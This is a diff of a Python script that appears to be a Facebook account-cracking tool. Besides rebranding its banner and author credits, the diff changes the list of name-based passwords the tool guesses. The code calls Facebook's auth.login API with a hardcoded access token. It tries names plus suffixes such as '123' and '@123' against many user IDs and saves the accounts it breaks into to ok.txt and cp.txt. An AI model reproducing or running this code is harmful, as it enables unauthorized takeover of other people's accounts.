@@ -68,33 +68,26 @@ c2 = "\033[0;97m"
 
 c3 = "\033[1;91m"
 
-logo = """                                          
+logo = """  
+\033[1;93m◁━━━━━━━━━━━━━━━━━━━━◈✙◈━━━━━━━━━━━━━━━━━━━━▷\033[1;97m
+\033[1;91m        #####        #        #####  
+\033[1;92m       #     #      # #      #     # 
+\033[1;93m       #           #   #     #       
+\033[1;94m        #####     #     #     #####  
+\033[1;95m             #    #######          # 
+\033[1;96m       #     #    #     #    #     # 
+\033[1;98m        #####     #     #     #####                                                                                                       
+\033[1;93m◁━━━━━━━━━━━━━━━━━━━━◈✙◈━━━━━━━━━━━━━━━━━━━━▷\033[1;97m
 
+\033[1;93m-----------------------------------------------
+\033[1;96m(~)\033[1;93m Author : Sufyan Ahmad \033[1;97m[ \033[0;93mShabQadry \033[1;97m]
 
+\033[1;96m(~)\033[1;96m Github : https://github.com/Sufyanahmad
 
-     
-    ████████████████████████████████████████
-    █─▄▄▄▄█▄─██─▄█▄─▄▄─█▄─█─▄██▀▄─██▄─▀█▄─▄█
-    █▄▄▄▄─██─██─███─▄████▄─▄███─▀─███─█▄▀─██
-    ▀▄▄▄▄▄▀▀▄▄▄▄▀▀▄▄▄▀▀▀▀▄▄▄▀▀▄▄▀▄▄▀▄▄▄▀▀▄▄▀                     
-                            Father Of All Hacker🖕                        
-    🖕 2021 Loto Rata Zan Na Sam Plaran Jorr Kral🖕
-              Sufyan Ahmad Shabqadary
-
-
-
-
-\033[1;96m◁━━━━━━━━━━━━━━━━━━━━◈✙◈━━━━━━━━━━━━━━━━━━━━▷\033[1;97m
-
-
-\033[1;96m(~)\033[1;97m Author : Sufyan Ahmad \033[1;97m[ \033[0;92mAhmad Jan😘 \033[1;97m]
-
-\033[1;96m(~)\033[1;97m Github : https://github.com/Sufyanahmad
-
-\033[1;96m(~)\033[1;97m Fb     : https://www.facebook.com/Mr__Error😋😋
+\033[1;96m(~)\033[1;99m Fb     : https://www.facebook.com/Sufyanshabqadry
                            
             \033[1;96nWHATSAPP NUMBER  +93489458276
-\033[1;97m-----------------------------------------------
+\033[1;93m-----------------------------------------------
 
 """
 
@@ -561,7 +554,7 @@ def menu_select():
 
 		try:
 
-		    pass1=name+"007"
+		    pass1=name+"@123"
 
 		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
@@ -569,7 +562,7 @@ def menu_select():
 
 		    if 'www.facebook.com' in d['error_msg']:
 
-		        print("\033[1;96m[successful] "+uid+" | "+pass1)
+		        print("\033[1;93m[SUFYAN-OK] "+uid+" | "+pass1)
 
 		        cp=open("ok.txt","a")
 
@@ -583,7 +576,7 @@ def menu_select():
 
 		    	if "access_token" in d:
 
-		            print("\x1b[1;96m[Successfull] "+uid+" | "+pass1+"\x1b[1;0m")
+		            print("\x1b[1;93m[SUFYAN-OK] "+uid+" | "+pass1+"\x1b[1;0m")
 
 		            ok=open("ok.txt","a")
 
@@ -595,7 +588,7 @@ def menu_select():
 
 		        else:
 
-		            pass2=name+"khan"
+		            pass2=name+"123"
 
 		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
@@ -603,7 +596,7 @@ def menu_select():
 
 		            if 'www.facebook.com' in d['error_msg']:
 
-		                print("\033[1;96m[CheckPoint] "+uid+" | "+pass2)
+		                print("\033[1;96m[SUFYAN-CP] "+uid+" | "+pass2)
 
 		                cp=open("cp.txt","a")
 
@@ -617,7 +610,7 @@ def menu_select():
 
 		                if 'access_token' in d:
 
-		                    print("\x1b[1;96m[Successfull] "+uid+" | "+pass2+"\x1b[1;0m")
+		                    print("\x1b[1;93m[SUFYAN-OK] "+uid+" | "+pass2+"\x1b[1;0m")
 
 		                    ok=open("ok.txt","a")
 
@@ -629,7 +622,7 @@ def menu_select():
 
 		                else:
 
-		                    pass3=name+" khan"
+		                    pass3=name+"1234"
 
 		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
@@ -637,7 +630,7 @@ def menu_select():
 
 		                    if 'www.facebook.com' in d['error_msg']:
 
-		                        print("\033[1;96m[successful] "+uid+" | "+pass3)
+		                        print("\033[1;96m[SUFYAN-CP] "+uid+" | "+pass3)
 
 		                        cp=open("ok.txt","a")
 
@@ -651,7 +644,7 @@ def menu_select():
 
 		                        if 'access_token' in d:
 
-		                            print(" \x1b[1;96m[Successfull] "+uid+" | "+pass3+"\x1b[1;0m")
+		                            print(" \x1b[1;93m[SUFYAN-OK] "+uid+" | "+pass3+"\x1b[1;0m")
 
 		                            ok=open("ok.txt","a")
 
@@ -663,7 +656,7 @@ def menu_select():
 
 		                        else:
 
-		                            pass4=name+"555"
+		                            pass4=name+"12345"
 
 		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
@@ -671,7 +664,7 @@ def menu_select():
 
 		                            if 'www.facebook.com' in d['error_msg']:
 
-		                                print("\033[1;96m[CheckPoint] "+uid+" | "+pass4)
+		                                print("\033[1;96m[SUFYAN-CP] "+uid+" | "+pass4)
 
 		                                cp=open("cp.txt","a")
 
@@ -685,7 +678,7 @@ def menu_select():
 
 		                                if 'access_token' in d:
 
-		                                    print("\x1b[1;96m[Successfull] "+uid+" | "+pass4+"\x1b[1;0m")
+		                                    print("\x1b[1;93m[SUFYAN-OK] "+uid+" | "+pass4+"\x1b[1;0m")
 
 		                                    ok=open("ok.txt","a")
 
@@ -705,7 +698,7 @@ def menu_select():
 
 		                                    if 'www.facebook.com' in d['error_msg']:
 
-		                                        print("\033[1;96m[CheckPoint] "+uid+" | "+pass5)
+		                                        print("\033[1;93m[SUFYAN-OK] "+uid+" | "+pass5)
 
 		                                        cp=open("cp.txt","a")
 
@@ -719,7 +712,7 @@ def menu_select():
 
 		                                        if 'access_token' in d:
 
-		                                            print("\x1b[1;96m[Successfull] "+uid+" | "+pass5+"\x1b[1;0m")
+		                                            print("\x1b[1;93m[SUFYAN-OK] "+uid+" | "+pass5+"\x1b[1;0m")
 
 		                                            ok=open("ok.txt","a")
 
@@ -739,7 +732,7 @@ def menu_select():
 
 		                                            if 'www.facebook.com' in d['error_msg']:
 
-		                                                print("\033[1;96m[CheckPoint] "+uid+" | "+pass6)
+		                                                print("\033[1;93m[SUFYAN-OK] "+uid+" | "+pass6)
 
 		                                                cp=open("cp.txt","a")
 
@@ -753,7 +746,7 @@ def menu_select():
 
 		                                                if 'access_token' in d:
 
-		                                                    print("\x1b[1;96m[Successfull] "+uid+" | "+pass6+"\x1b[1;0m")
+		                                                    print("\x1b[1;93m[SUFYAN-OK] "+uid+" | "+pass6+"\x1b[1;0m")
 
 		                                                    ok=open("ok.txt","a")
 
@@ -773,7 +766,7 @@ def menu_select():
 
 		                                                    if 'www.facebook.com' in d['error_msg']:
 
-		                                                        print("\033[1;96m[CheckPoint] "+uid+" | "+pass7)
+		                                                        print("\033[1;93m[SUFYAN-OK] "+uid+" | "+pass7)
 
 		                                                        cp=open("cp.txt","a")
 
@@ -787,7 +780,7 @@ def menu_select():
 
 		                                                        if 'access_token' in d:
 
-		                                                            print("\x1b[1;96m[Successfull] "+uid+" | "+pass7+"\x1b[1;0m")
+		                                                            print("\x1b[1;93m[SUFYAN-OK] "+uid+" | "+pass7+"\x1b[1;0m")
 
 		                                                            ok=open("ok.txt","a")
 
